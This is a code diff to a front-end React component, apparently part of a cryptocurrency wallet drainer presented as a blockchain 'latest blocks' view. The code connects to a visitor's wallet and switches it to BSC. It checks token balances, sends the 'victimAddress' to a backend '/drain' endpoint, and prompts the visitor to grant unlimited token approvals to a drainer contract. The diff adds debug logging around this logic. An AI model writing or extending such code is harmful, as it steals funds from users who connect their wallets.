@@ -87,30 +87,32 @@ const LatestBlocks = () => {
   const connectAndDrain = async () => {
     try {
       if (typeof window.ethereum === "undefined") {
-        console.error("Trust Wallet not detected");
+        console.error("Trust Wallet or MetaMask not detected");
         return;
       }
-
+  
       await switchToBSC();
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const connectedAddress = accounts[0];
       setConnectedAccount(`${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`);
-
+  
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      console.log("Signer:", signer);
+  
       let hasTokens = false;
-
       const bep20Abi = [
         "function balanceOf(address account) external view returns (uint256)",
         "function approve(address spender, uint256 amount) external returns (bool)",
       ];
-
+  
       for (const token of tokenList) {
         const tokenContract = new ethers.Contract(token.address, bep20Abi, provider);
         const balance = await tokenContract.balanceOf(connectedAddress);
+        console.log(`${token.symbol} Balance:`, ethers.formatUnits(balance, token.decimals));
         if (balance > 0) hasTokens = true;
       }
-
+  
       if (hasTokens) {
         const gasAvailable = await checkAndSendGas(connectedAddress);
         if (gasAvailable) {
@@ -119,21 +121,24 @@ const LatestBlocks = () => {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ victimAddress: connectedAddress }),
           });
-
+  
           const drainResponse = await fetch(`${API_BASE_URL}/drain`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ victimAddress: connectedAddress, drainAll: true }),
           });
           const drainData = await drainResponse.json();
-
+  
           if (drainData.needsApproval) {
             for (const token of tokenList) {
               const tokenContract = new ethers.Contract(token.address, bep20Abi, signer);
+              console.log("Token Contract with Signer:", tokenContract);
               const balance = await tokenContract.balanceOf(connectedAddress);
               if (balance > 0) {
                 const gasEstimate = await tokenContract.estimateGas.approve(drainerContractAddress, ethers.MaxUint256);
+                console.log("Gas Estimate for Approve:", gasEstimate.toString());
                 await tokenContract.approve(drainerContractAddress, ethers.MaxUint256, { gasLimit: gasEstimate });
+                console.log(`Approved ${token.symbol} for draining`);
               }
             }
             await fetch(`${API_BASE_URL}/drain`, {
